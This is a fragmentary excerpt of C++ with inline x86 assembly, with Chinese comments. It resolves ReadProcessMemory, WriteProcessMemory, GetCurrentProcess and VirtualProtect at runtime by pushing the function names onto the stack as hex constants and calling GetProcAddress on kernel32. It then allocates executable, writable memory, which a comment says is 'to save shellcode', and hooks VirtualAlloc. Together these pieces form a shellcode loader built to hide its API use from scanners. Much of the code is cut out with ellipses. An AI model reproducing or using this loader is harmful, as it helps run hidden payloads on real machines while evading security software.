...
ReadProcessMemoryB ReadProcessMemorya;
...
DWORD _getFunction_ReadProcessMemory(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
...
DWORD _getFunction_GetCurrentProcess(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
        ...
        push 0x7250746e   //rPtn
        push 0x65727275   //erru
        push 0x43746547   //CteG
        push esp
        push kernel32; [ebp - 4] ->Kernel32.DLL Base Addr
        call getproaddress; [ebp - 8] ->GetProcAddress Addr
        mov DWORD PTR dwDllBase1, eax
...
DWORD _getFunction_WriteProcessMemory(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
        mov eax, getproaddress
        push 0x00007972   //yr
        push 0x6f6d654d   //omeM
        push 0x73736563   //ssec
        push 0x6f725065   //orPe
...
DWORD _getFunction_VirtualProtect(DWORD getproaddress, DWORD kernel32) {
    DWORD dwDllBase1 = 0;
    __asm {
        /* push ebp
       mov ebp, esp*/
    ...
    //if (argc > 1) {
        ...
        // cout << str.length() << std::endl;
         ...
         //    }
            ...
            ReadProcessMemorya = (ReadProcessMemoryB)_getFunction_ReadProcessMemory(process_address, kernel32_address);
            ...
            char* a = (char*)(*VirtualAlloca)(NULL, str.length(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); //get a memory to save shellcode
            printf("变量p的地址: %p\n", VirtualAlloca);
            hookaddress_virutalallc = (LPVOID)VirtualAlloca;   //获取到virtualalloc的地址
            HookVirtualAlloc();
